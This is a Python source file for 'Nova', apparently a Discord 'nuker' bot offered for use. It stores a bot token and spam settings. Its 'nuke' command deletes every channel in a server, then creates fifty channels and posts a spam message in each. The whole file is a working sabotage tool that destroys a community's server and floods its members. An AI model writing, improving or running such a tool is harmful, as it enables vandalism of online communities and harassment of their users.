# Simple Nuker by - https://github.com/Day420

import ctypes
import os
import asyncio
import discord
import time
from discord.ext import commands
from colorama import *

m = Fore.LIGHTMAGENTA_EX
r = Fore.RESET
e = Fore.RED
y = Fore.YELLOW
g = Fore.GREEN
Nova = discord.Client()

def clear():
    os.system("cls")

def title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def menu():
    os.system('mode con: cols=83 lines=30')
    title("Nova - Setup - Simple Nuker")
    clear()
    print(f"""{m} 
 ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ 
 ████╗  ██║██╔═══██╗██║   ██║██╔══██╗
 ██╔██╗ ██║██║   ██║██║   ██║███████║
 ██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║
 ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
 ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝{r}
 {m}|{r} Simple Discord nuker by https://github.com/Day420
 """)
    if not os.path.isfile('.token'):
        token = input(f" {m}|{r} Bot token : ")
        f = open(".token", "w")
        f.write(token)
        f.close()
    else:
        yn = input(f" {y}|{r} Already found token in '.token', do you want to use it? [y/n]: ")
        yn = yn.lower()
        if yn == 'y':
            f = open(".token")
            token = f.read()
            print(f" {m}|{r} Using token : {token}")
        else:
            token = input(f" {m}|{r} Bot token : ")
            f = open(".token", "w")
            f.write(token)
            f.close()
    if not os.path.isfile('.prefix'):
        prefix = input(f" {m}|{r} Bot prefix : ")
        f = open(".prefix", "w")
        f.write(prefix)
        f.close()
    else:
        yn = input(f" {y}|{r} Already found prefix in '.prefix', do you want to use it? [y/n]: ")
        yn = yn.lower()
        if yn == 'y':
            f = open(".prefix")
            prefix = f.read()
            print(f" {m}|{r} Using prefix : {prefix}")
        else:
            prefix = input(f" {m}|{r} Bot prefix : ")
            f = open(".prefix", "w")
            f.write(prefix)
            f.close()
    if not os.path.isfile('.message'):
        spammessage = input(f" {m}|{r} Spam message : ")
        f = open(".message", "w")
        f.write(spammessage)
        f.close()
    else:
        yn = input(f" {y}|{r} Already found spam message in '.message', do you want to use it? [y/n]: ")
        yn = yn.lower()
        if yn == 'y':
            f = open(".message")
            spammessage = f.read()
            print(f" {m}|{r} Using spam message : {spammessage}")
        else:
            spammessage = input(f" {m}|{r} Spam message : ")
            f = open(".message", "w")
            f.write(spammessage)
            f.close()
    if not os.path.isfile('.channelsname'):
        channelsname = input(f" {m}|{r} Channels name : ")
        channelsname = channelsname.lower()
        channelsname.replace("", "-")
        f = open(".channelsname", "w")
        f.write(channelsname)
        f.close()
    else:
        yn = input(f" {y}|{r} Already found channels name in '.channelsname', do you want to use it? [y/n]: ")
        yn = yn.lower()
        if yn == 'y':
            f = open(".channelsname")
            channelsname = f.read()
            print(f" {m}|{r} Using channels name : {channelsname}")
        else:
            channelsname = input(f" {m}|{r} Channels name : ")
            channelsname = channelsname.lower()
            channelsname.replace("", "-")
            f = open(".channelsname", "w")
            f.write(channelsname)
            f.close()
    main()


def main():
    prefix = open(".prefix", "r")
    prefix = prefix.read()
    token = open(".token", "r")
    token = token.read()
    channelsname = open(".channelsname", "r")
    channelsname = channelsname.read()
    spammessage = open(".message", "r")
    spammessage = spammessage.read()
    Nova = commands.Bot(command_prefix=prefix)
    Nova.remove_command('help')
    @Nova.event
    async def on_ready():
        activity = discord.Game(name=f"Nova | {prefix}", type=3)
        await Nova.change_presence(status=discord.Status.dnd, activity=activity)
        clear()
        print(f"""{m} 
 ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ 
 ████╗  ██║██╔═══██╗██║   ██║██╔══██╗
 ██╔██╗ ██║██║   ██║██║   ██║███████║
 ██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║
 ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
 ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝{r}
 {m}|{r} Simple Discord nuker by https://github.com/Day420
 """)
        title(f"Nova - {Nova.user} - Simple Nuker")
        print(f" {m}|{r} Bot : {Nova.user}")
        print(f" {m}|{r} Prefix : {prefix}")
        print(f" {m}|{r} Channels name : {channelsname}")
        print(f" {m}|{r} Spam message : {spammessage}")
        print(f"")

    @Nova.command()
    async def nuke(ctx):
        await ctx.message.delete()
        print(f" {y}|{r} Nuking {ctx.guild.name} ({ctx.guild.id})...")
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f" {g}|{r} Deleted : #{channel.name}")
            except:
                pass
                print(f" {e}|{r} Couldnt delete : #{channel.name}")
        try:
            for i in range(50):
                channel = await ctx.guild.create_text_channel(channelsname)
                await channel.send(spammessage)
                print(f" {g}|{r} Created : #{channel.name} and sent message : {spammessage}")
        except Exception as er:
            print(f" {e}|{r} Error : {er}")
    try:
        Nova.run(token)
    except Exception as er:
        pass
        print(f" {e}|{r} Invalid token.")
        input()

while True:
    menu()
